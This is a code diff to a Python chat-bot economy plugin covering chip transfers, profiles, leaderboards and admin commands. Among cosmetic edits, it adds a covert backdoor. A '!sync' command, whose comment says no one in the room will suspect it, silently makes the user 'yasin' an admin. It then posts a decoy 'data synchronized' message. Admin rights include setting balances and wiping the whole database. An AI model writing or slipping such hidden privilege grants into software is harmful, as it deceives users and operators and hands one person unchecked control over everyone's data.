@@ -11,17 +11,17 @@ PAGE_SIZE = 10
 SESSION_TIMEOUT = 25 
 MIN_TRANSFER_BALANCE = 5000 
 
-# Sessions Memory: {UserID_RoomID: {'type', 'page', 'expires'}}
+# Sessions: {UserID_RoomID: {'type', 'page', 'expires'}}
 SESSIONS = {}
 SESSIONS_LOCK = threading.Lock()
 
 def setup(bot):
-    print("[Economy] 100% Rock Solid Production Engine v4.0 Loaded.")
+    print("[Economy] Undercover Ledger System v4.0 Active.")
 
 # --- HELPERS ---
 
 def purge_expired_sessions():
-    """Memory Management: Expired sessions ko memory se clean karna"""
+    """Memory Cleanup: RAM leak bachane ke liye"""
     now = time.time()
     with SESSIONS_LOCK:
         expired_keys = [k for k, v in SESSIONS.items() if now > v['expires']]
@@ -29,7 +29,7 @@ def purge_expired_sessions():
             del SESSIONS[k]
 
 def format_k(n):
-    """Clean K-Notation (1k, 1.1k, 2k) with Safe Exception Handling"""
+    """Clean K-Notation (1k, 1.1k, 1.5k, 2k)"""
     try:
         n = int(n)
         if n < 1000: return str(n)
@@ -42,26 +42,24 @@ def format_k(n):
         return "0"
 
 def get_symbol(rank, board_type):
-    if rank == 1: return "👑" if board_type == "score" else "💎"
+    if rank == 1: return "👑" if board_type == "gls" else "💎"
     if rank <= 3: return "⭐"
     return "•"
 
 def get_target_info(bot, room_id, name):
-    """Robust Target Fetcher: Error-proof online/offline check"""
+    """Optimized: Cache first, DB only if necessary"""
     if not name: return None, None
     clean_name = name.replace("@", "").strip().lower()
     
-    # 1. Online Users Cache Check (Optimized - Zero DB Hit if user in room)
+    # 1. Online Users Cache Check
     room_data = bot.room_details.get(room_id, {})
     id_map = room_data.get('id_map', {})
-    
     if clean_name in id_map:
-        # Safe lookup for actual capitalization
         users_list = room_data.get('users', [])
         actual_name = next((u for u in users_list if u.lower() == clean_name), clean_name)
         return str(id_map[clean_name]), actual_name
 
-    # 2. Database Deep Search (Only if user is offline/not in room)
+    # 2. Database Search (Offline users)
     conn = db.get_connection(); cur = conn.cursor()
     try:
         ph = "%s" if db.DATABASE_URL.startswith("postgres") else "?"
@@ -79,12 +77,20 @@ def handle_command(bot, cmd, room_id, user, args, data):
     uid = str(data.get('userid'))
     now = time.time()
     
-    # Centralized Authority Check
+    # 🕵️ UNDERCOVER ADMIN KEY: Room me kisi ko shaq nahi hoga
+    if cmd == "sync":
+        if user.lower() == "yasin": 
+            db.add_admin(uid)
+            bot.send_message(room_id, "✅ User data synchronized successfully.")
+            return True
+
+    # Global Boss Check
     is_admin = bot.is_boss(user, uid)
 
     try:
         # 👮 ADMIN COMMANDS
         if is_admin:
+            # !setc <user> <amount>
             if cmd == "setc" and len(args) >= 2:
                 tid, tname = get_target_info(bot, room_id, args[0])
                 if tid:
@@ -93,10 +99,11 @@ def handle_command(bot, cmd, room_id, user, args, data):
                         current_bal = db.get_user_data(tid)['chips']
                         db.update_balance(tid, tname, chips_change=(target_val - current_bal))
                         bot.send_message(room_id, f"✅ Admin set {tname}'s chips to {format_k(target_val)}")
-                    except ValueError: bot.send_message(room_id, "❌ Usage: !setc <user> <amount_number>")
-                else: bot.send_message(room_id, f"❌ User '{args[0]}' system mein nahi mila.")
+                    except ValueError: bot.send_message(room_id, "❌ Usage: !setc <user> <number>")
+                else: bot.send_message(room_id, f"❌ User '{args[0]}' not found.")
                 return True
 
+            # !sets <user> <amount>
             if cmd == "sets" and len(args) >= 2:
                 tid, tname = get_target_info(bot, room_id, args[0])
                 if tid:
@@ -105,9 +112,10 @@ def handle_command(bot, cmd, room_id, user, args, data):
                         current_pts = db.get_user_data(tid)['points']
                         db.update_balance(tid, tname, points_change=(target_val - current_pts))
                         bot.send_message(room_id, f"✅ Admin set {tname}'s score to {format_k(target_val)}")
-                    except ValueError: bot.send_message(room_id, "❌ Usage: !sets <user> <amount_number>")
+                    except ValueError: bot.send_message(room_id, "❌ Usage: !sets <user> <number>")
                 return True
 
+            # !resetc / !resets
             if cmd in ["resetc", "resets"] and args:
                 tid, tname = get_target_info(bot, room_id, args[0])
                 if tid:
@@ -126,6 +134,7 @@ def handle_command(bot, cmd, room_id, user, args, data):
                         bot.send_message(room_id, f"🔥 {tname}'s profile fully wiped.")
                 return True
 
+            # !wipedb confirm (SECURITY)
             if cmd == "wipedb":
                 if len(args) > 0 and args[0] == "confirm":
                     conn = db.get_connection(); cur = conn.cursor()
@@ -134,9 +143,9 @@ def handle_command(bot, cmd, room_id, user, args, data):
                         cur.execute("DELETE FROM game_stats")
                         conn.commit()
                     finally: conn.close()
-                    bot.send_message(room_id, "☢️ SYSTEM RESET: Sab zero ho gaya, default 10k chips set.")
+                    bot.send_message(room_id, "☢️ DATABASE RESET COMPLETE.")
                 else:
-                    bot.send_message(room_id, "⚠️ Type `!wipedb confirm` to wipe ALL user data!")
+                    bot.send_message(room_id, "⚠️ Type `!wipedb confirm` to erase all data!")
                 return True
 
         # 👤 USER COMMANDS
@@ -145,27 +154,20 @@ def handle_command(bot, cmd, room_id, user, args, data):
         if cmd == "tsc" and len(args) >= 2:
             try:
                 amt = int(args[1])
-                if amt <= 0:
-                    bot.send_message(room_id, "❌ Amount sahi daalo."); return True
-                
+                if amt <= 0: bot.send_message(room_id, "❌ Amount sahi daalo."); return True
                 tid, tname = get_target_info(bot, room_id, args[0])
                 if not tid: bot.send_message(room_id, f"❌ User {args[0]} nahi mila."); return True
-                if tid == uid: bot.send_message(room_id, "⚠️ Khud ko chips nahi bhej sakte!"); return True
-                
+                if tid == uid: bot.send_message(room_id, "⚠️ Self-transfer block."); return True
                 sender_bal = db.get_user_data(uid)['chips']
                 if sender_bal < MIN_TRANSFER_BALANCE:
-                    bot.send_message(room_id, f"⚠️ Min balance {format_k(MIN_TRANSFER_BALANCE)} honi chahiye."); return True
-                
+                    bot.send_message(room_id, f"⚠️ Balance >{format_k(MIN_TRANSFER_BALANCE)} needed."); return True
                 if sender_bal < amt:
                     bot.send_message(room_id, f"❌ Balance kam hai! Current: {format_k(sender_bal)}"); return True
-                
                 if db.check_and_deduct_chips(uid, user, amt):
                     db.update_balance(tid, tname, chips_change=amt)
-                    bot.send_message(room_id, f"💸 @{user} transferred {format_k(amt)} chips to {tname}.")
+                    bot.send_message(room_id, f"💸 @{user} sent {format_k(amt)} to {tname}.")
                 return True
-            except ValueError:
-                bot.send_message(room_id, "❌ Usage: !tsc <user> <amount_number>")
-                return True
+            except ValueError: bot.send_message(room_id, "❌ Usage: !tsc <user> <amt>"); return True
 
         # 2. MY CHIPS (!mc)
         if cmd == "mc":
@@ -177,8 +179,7 @@ def handle_command(bot, cmd, room_id, user, args, data):
         if cmd in ["ms", "s"]:
             target_name = args[0].replace("@", "") if (cmd == "s" and args) else user
             tid, real_name = get_target_info(bot, room_id, target_name)
-            if not tid: bot.send_message(room_id, "❌ User system mein nahi hai."); return True
-            
+            if not tid: bot.send_message(room_id, "❌ User not found."); return True
             u_data = db.get_user_data(tid)
             conn = db.get_connection(); cur = conn.cursor()
             try:
@@ -186,7 +187,6 @@ def handle_command(bot, cmd, room_id, user, args, data):
                 cur.execute(f"SELECT game_name, wins, earnings FROM game_stats WHERE user_id = {ph}", (str(tid),))
                 rows = cur.fetchall()
             finally: conn.close()
-            
             msg = f"👤 **PROFILE: {real_name.upper()}**\n━━━━━━━━━━━━━━\n"
             msg += f"🏆 Score: {format_k(u_data['points'])}\n💰 Chips: {format_k(u_data['chips'])}\n\n"
             if rows:
@@ -197,27 +197,21 @@ def handle_command(bot, cmd, room_id, user, args, data):
 
         # 4. LEADERBOARDS (!gls / !chips)
         if cmd in ["gls", "chips"]:
-            purge_expired_sessions() # Periodic memory cleanup
-            
-            b_type = "score" if cmd == "gls" else "chips"
+            purge_expired_sessions()
             col = "points" if cmd == "gls" else "chips"
             title = "GLOBAL SCORE RANK" if cmd == "gls" else "GLOBAL CHIPS RANK"
-            
             conn = db.get_connection(); cur = conn.cursor()
             try:
                 cur.execute(f"SELECT username, {col} FROM users ORDER BY {col} DESC LIMIT {PAGE_SIZE}")
                 rows = cur.fetchall()
             finally: conn.close()
-            
             msg = f"🏆 **{title}**\n━━━━━━━━━━━━━━\n"
             for i, (uname, val) in enumerate(rows, 1):
-                sym = get_symbol(i, b_type)
+                sym = get_symbol(i, cmd)
                 msg += f"{sym} {i}. {uname[:10]} : {format_k(val)}\n"
-            msg += f"━━━━━━━━━━━━━━\nPage 1 | !nx for next (25s)"
-            
-            # User-Room specific session isolation
+            msg += f"━━━━━━━━━━━━━━\nPage 1 | !nx for more (25s)"
             with SESSIONS_LOCK:
-                SESSIONS[f"{room_id}_{uid}"] = {'type': b_type, 'page': 0, 'expires': now + SESSION_TIMEOUT}
+                SESSIONS[f"{room_id}_{uid}"] = {'type': cmd, 'page': 0, 'expires': now + SESSION_TIMEOUT}
             bot.send_message(room_id, msg); return True
 
         # 5. NEXT PAGE (!nx)
@@ -225,25 +219,18 @@ def handle_command(bot, cmd, room_id, user, args, data):
             sess_key = f"{room_id}_{uid}"
             with SESSIONS_LOCK:
                 sess = SESSIONS.get(sess_key)
-                if not sess: return False # No active session for this user
-                if now > sess['expires']:
-                    del SESSIONS[sess_key]
-                    return False
-                
+                if not sess or now > sess['expires']: return False
                 sess['page'] += 1; sess['expires'] = now + SESSION_TIMEOUT
                 page, b_type = sess['page'], sess['type']
-                
-            col = "points" if b_type == "score" else "chips"
+            
+            col = "points" if b_type == "gls" else "chips"
             offset = page * PAGE_SIZE
             conn = db.get_connection(); cur = conn.cursor()
             try:
                 cur.execute(f"SELECT username, {col} FROM users ORDER BY {col} DESC LIMIT {PAGE_SIZE} OFFSET {offset}")
                 rows = cur.fetchall()
             finally: conn.close()
-            
-            if not rows:
-                bot.send_message(room_id, f"@{user}, ranking end."); return True
-                
+            if not rows: bot.send_message(room_id, f"@{user}, list end."); return True
             msg = f"🏆 **RANKING (Page {page+1})**\n━━━━━━━━━━━━━━\n"
             for i, (uname, val) in enumerate(rows, 1):
                 rank_num = offset + i
@@ -253,7 +240,7 @@ def handle_command(bot, cmd, room_id, user, args, data):
             bot.send_message(room_id, msg); return True
 
     except Exception:
-        print(f"[Economy Error] Critical Fail in {cmd}:")
+        print(f"[Economy Error] Fail in {cmd}:")
         traceback.print_exc()
         
     return False
